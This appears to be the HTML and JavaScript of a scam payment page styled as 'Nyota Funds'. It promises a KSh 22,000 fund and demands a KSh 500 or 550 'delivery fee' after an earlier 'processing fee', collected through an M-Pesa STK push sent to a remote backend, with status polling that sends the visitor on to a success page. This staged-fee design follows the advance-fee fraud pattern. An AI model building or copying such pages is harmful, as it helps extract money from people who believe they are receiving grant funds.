<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Select Pay Delivery Charges - Nyota Funds</title>

<style>

body{
    font-family:Arial,sans-serif;
    background:#f5f7fb;
    margin:0;
    padding:10px;
}

.container{
    max-width:430px;
    margin:auto;
    background:white;
    padding:15px;
    border-radius:18px;
    box-shadow:0 5px 15px rgba(0,0,0,0.1);
    text-align:center;
}

h2{
    color:#1b5e20;
    font-size:21px;
    margin:5px 0 12px;
}

.success-box{
    background:#e8f5e9;
    color:#1b5e20;
    padding:12px;
    border-radius:12px;
    font-size:14px;
    margin-bottom:10px;
}

.confirm-box{
    background:#f1f8e9;
    color:#2e7d32;
    padding:10px;
    border-radius:12px;
    font-size:14px;
    margin-bottom:12px;
}

.details-box{
    background:#fafafa;
    padding:12px;
    border-radius:12px;
    text-align:left;
    font-size:14px;
}

.details-box p{
    margin:8px 0;
}

.method{
    border:1px solid #ddd;
    padding:10px;
    border-radius:10px;
    margin-top:8px;
}

.method input{
    margin-right:8px;
}

.fee{
    font-weight:bold;
    color:#1b5e20;
}

button{
    width:100%;
    padding:14px;
    margin-top:12px;
    border:none;
    border-radius:10px;
    background:#1565c0;
    color:white;
    font-size:16px;
    font-weight:bold;
}

#status{
    margin-top:10px;
    font-size:14px;
    color:#555;
}

.secure{
    font-size:13px;
    color:#777;
    margin-top:10px;
}

</style>

</head>


<body>


<div class="container">


<h2>Select Pay Delivery Charges</h2>


<div class="success-box">

Great news 🎉 <br>

Your NYOTA FUNDS is ready for delivery

</div>


<div class="confirm-box">

✅ Processing fee confirmed

</div>


<div class="details-box">


<p>
<b>NYOTA FUND:</b> KSh 22,000
</p>


<p>
<b>Full Name:</b> <span id="fullName">Loading...</span>
</p>


<p>
<b>Phone Number:</b> <span id="phoneNumber">Loading...</span>
</p>



<b>Select Delivery Method</b>


<div class="method">

<label>

<input type="radio" name="delivery" value="500" onclick="updateFee()">

Safaricom M-Pesa — KSh 500

</label>

</div>



<div class="method">

<label>

<input type="radio" name="delivery" value="550" onclick="updateFee()">

Bank Account — KSh 550

</label>

</div>



<p class="fee">

Delivery Fee: KSh <span id="deliveryFee">--</span>

</p>


</div>



<button onclick="payDelivery()">

Pay Delivery Charges

</button>



<div id="status"></div>


<p class="secure">

🔒 Secure STK Push • Instant Confirmation

</p>


</div>




<script>


// Load applicant details

document.getElementById("fullName").innerHTML =
localStorage.getItem("fullName") || "Applicant";


document.getElementById("phoneNumber").innerHTML =
localStorage.getItem("phoneNumber") || "07XXXXXXXX";




// Update delivery fee

function updateFee(){

let selected = document.querySelector('input[name="delivery"]:checked');

if(selected){

document.getElementById("deliveryFee").innerHTML = selected.value;

}

}




async function payDelivery(){

let selected = document.querySelector('input[name="delivery"]:checked');

if(!selected){
    alert("Please select delivery method");
    return;
}

let phone = localStorage.getItem("phoneNumber");

if(!phone){
    alert("Phone number not found.");
    return;
}

let amount = Number(selected.value);

let status = document.getElementById("status");

status.innerHTML = "Sending STK Push...";

try{

let response = await fetch(
"https://nyota-funds-backend.onrender.com/stk-push",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
phone: phone,
amount: amount
})
}
);

let data = await response.json();

console.log(data);

let checkoutId = data.data.checkout_request_id;

status.innerHTML =
"📱 STK Push sent. Please enter your M-PESA PIN.";

checkPayment(checkoutId);

}catch(error){

console.log(error);

status.innerHTML =
"❌ Failed to send STK Push.";

}

}

async function checkPayment(checkoutId){

let interval = setInterval(async()=>{

try{

let response = await fetch(
"https://nyota-funds-backend.onrender.com/payment-status",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
checkout_request_id: checkoutId
})
}
);

let result = await response.json();

console.log(result);

if(result.status==="completed"){

clearInterval(interval);

document.getElementById("status").innerHTML =
"✅ Delivery charges paid successfully.";

 window.location.href="success.html";// Change if you use a different page

}

else if(result.status==="cancelled"){

clearInterval(interval);

document.getElementById("status").innerHTML =
"❌ Payment cancelled.";

}

else if(result.status==="failed"){

clearInterval(interval);

document.getElementById("status").innerHTML =
"❌ Payment failed.";

}

}catch(error){

console.log(error);

}

},3000);

    }

</script>


</body>
</html>
